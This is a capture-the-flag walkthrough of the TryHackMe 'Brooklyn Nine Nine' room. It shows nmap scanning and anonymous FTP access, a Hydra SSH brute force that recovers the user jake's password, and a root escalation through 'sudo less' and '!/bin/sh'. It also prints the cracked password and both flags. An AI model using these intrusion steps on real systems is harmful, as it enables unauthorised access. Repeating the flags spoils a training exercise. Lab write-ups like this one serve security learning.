# Room Information

Room link: https://tryhackme.com/room/brooklynninenine

**Please feel free to point out any errors that you may see in this writeup!**

This writeup was last updated: 6/29/2023

# Scanning and Enumeration
> Port Scanning Using Nmap 
1. Started up this room’s machine
2. `nmap -sC -sV {TARGET-IP} > {FILENAME1}.txt` to perform a network scan to scan for open ports while utilizing default scripts (**-sC**) and version detection (**-sV**) to identify services, as well as their versions, and vulnerabilities on the target system, and then redirect the results into a text file
3. `cat {FILENAME1}.txt` to output the scan results from the previous command
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV 10.10.169.224 > PortScan.txt

```
```bash
┌──(kali㉿kali)-[~]
└─$ cat PortScan.txt 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-29 08:18 EDT
Nmap scan report for 10.10.169.224
Host is up (0.088s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.6.54.63
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 167f2ffe0fba98777d6d3eb62572c6a3 (RSA)
|   256 2e3b61594bc429b5e858396f6fe99bee (ECDSA)
|_  256 ab162e79203c9b0a019c8c4426015804 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.59 seconds

```

#
> Scanning the FTP Server
4. `ftp Anonymous@{TARGET IP}` to connect to the target's SSH server as **Anonymous**, which we found out that we could do from our Nmap scan 
```bash
┌──(kali㉿kali)-[~]
└─$ ftp Anonymous@10.10.169.224              
Connected to 10.10.169.224.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```
5. `ls -a` to list all of the files and directories, including the hidden ones, which reveals to us a single text file
6. `get {FILE1}.txt` to download the text file onto our attack machine
7. `exit` to terminate the FTP session and disconnect from the FTP server
```bash
ftp> ls -a
229 Entering Extended Passive Mode (|||21935|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        114          4096 May 17  2020 .
drwxr-xr-x    2 0        114          4096 May 17  2020 ..
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
```
```bash
ftp> get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
229 Entering Extended Passive Mode (|||24115|)
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
100% |***********************************************************************|   119        1.30 KiB/s    00:00 ETA
226 Transfer complete.
119 bytes received in 00:00 (0.66 KiB/s)
```
```bash
ftp> exit
221 Goodbye.
```
8. `ls` to list the available files and directories that are in our current directory to verify that the text file has been properly downloaded from the target's FTP server, which it has 
9. `cat {FILE1}.txt` to display the downloaded file's contents onto our terminal, which reveals that one of the target's users has a weak password
```bash
┌──(kali㉿kali)-[~]
└─$ ls
 note_to_jake.txt
```
```bash
┌──(kali㉿kali)-[~]
└─$ cat note_to_jake.txt 
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

# Vulnerability Identification
> Brute Forcing Using Hydra
10. `hydra -l {USER} -P {WORDLIST PATH} ssh://{TARGET IP}` to attempt to crack the vulnerable user's password, which ended up working and revealing to us their password 
```bash
┌──(kali㉿kali)-[~]
└─$ hydra -l jake -P rockyou.txt ssh://10.10.169.224
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-29 08:24:54
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ssh://10.10.169.224:22/
[22][ssh] host: 10.10.169.224   login: jake   password: 987654321
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-29 08:25:41
```

# Vulnerability Exploitation
> Connecting Using SSH
11. `ssh {USER}@{TARGET IP} -p 22` to connect to the target with the new set of credentials that we now have using SSH
```bash
┌──(kali㉿kali)-[~]
└─$ ssh jake@10.10.169.224 -p 22                
The authenticity of host '10.10.169.224 (10.10.169.224)' can't be established.
ED25519 key fingerprint is SHA256:ceqkN71gGrXeq+J5/dquPWgcPWwTmP2mBdFS2ODPZZU.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.169.224' (ED25519) to the list of known hosts.
jake@10.10.169.224's password: 
Last login: Tue May 26 08:56:58 2020
jake@brookly_nine_nine:~$ 
```
12. `ls /` to display the available files and directories within the target filesystem's root directory (**/**) onto our terminal
13. `ls /home` to display the available files and directories within the target filesystem's **/home** directory onto our terminal, which revealed there to be three users
14. `ls /home/holt` to display the available files and directories within the third user's home directory onto our terminal, since the two other don't have anything in theirs, which revealed a user text file
15. `cat /home/holt/{USER TEXT FILE}` to display the contents of the user text file onto our terminal, which revealed the user flag for this challenge
```bash
jake@brookly_nine_nine:~$ ls /
bin   cdrom  etc   initrd.img      lib    lost+found  mnt  proc  run   snap  sys  usr  vmlinuz
boot  dev    home  initrd.img.old  lib64  media       opt  root  sbin  srv   tmp  var  vmlinuz.old
```
```bash
jake@brookly_nine_nine:~$ ls /home
amy  holt  jake
```
```bash
jake@brookly_nine_nine:~$ ls /home/holt
nano.save  user.txt
```
```bash
jake@brookly_nine_nine:~$ cat /home/holt/user.txt
ee11cbb19052e40b07aac0ca060c23ee
```

# Post Exploitation
> Privilege Escalation
16. `sudo -l` to list the sudo privileges that are assigned to the current user that we're logged in as, which revealed that we're able to execute the **less** command with root privileges without needing root's password
```bash
jake@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```
17. `firefox "https://gtfobins.github.io/"` to laucn Firefox and redirect it to the GTFOBins website where we can search for exploits that we can use to elevate our privileges with the **less** command 

![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Brooklyn%20Nine%20Nine/GTFOBins.png)

18. `sudo less /etc/profile` to interactively view the **/etc/profile** file 
```bash
jake@brookly_nine_nine:~$ sudo less /etc/profile
```

![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Brooklyn%20Nine%20Nine/sudo%20less%20etc%20profile.png)

20. `!/bin/sh` to execute and spawn a Bourne shell (sh)
 
![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Brooklyn%20Nine%20Nine/!bin%20sh.png)

21. `whoami` to verify that we now a shell with root privileges, which we do since we're now running as root
22. `ls /root` to display the available files and directories of the target's **/root** directory, which reveals a root text file
23. `cat /root/{ROOT TEXT FILE}` to display the root text file's contents onto our terminal, which revealed the root flag for this challenge
```bash
# whoami
root
```
```bash
# ls /root
root.txt
```
```bash
# cat /root/root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845

Enjoy!!
```

**Room completed!**

![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/TryHackMe%20-%20Brooklin%20Nine%20Nine.png)

# Command History
1. `nmap -sC -sV {TARGET-IP} > {FILENAME1}.txt`
2. `cat {FILENAME1}.txt`
3. `ftp Anonymous@{TARGET IP}`
4. `ls -a`
5. `get {FILE1}.txt`
6. `exit`
7. `ls`
8. `cat {FILE1}.txt`
9. `hydra -l {USER} -P {WORDLIST PATH} ssh://{TARGET IP}`
10. `ssh {USER}@{TARGET IP} -p 22`
11. `ls /`
12. `ls /home`
13. `ls /home/holt`
14. `cat /home/holt/{USER TEXT FILE}`
15. `sudo -l`
16. `firefox "https://gtfobins.github.io/"`
17. `sudo less /etc/profile`
18. `!/bin/sh`
19. `whoami`
20. `ls /root`
21. `cat /root/{ROOT TEXT FILE}`

# Contributions
This writeup was made by Jonmar Corpuz, founder of **KnowCybersecurity** (www.knowwwcybersecurity.com)


Socials:
* TryHackMe ID: https://tryhackme.com/p/mtlfriends
* LinkedIn: https://www.linkedin.com/in/jonmar-corpuz-12771a234/



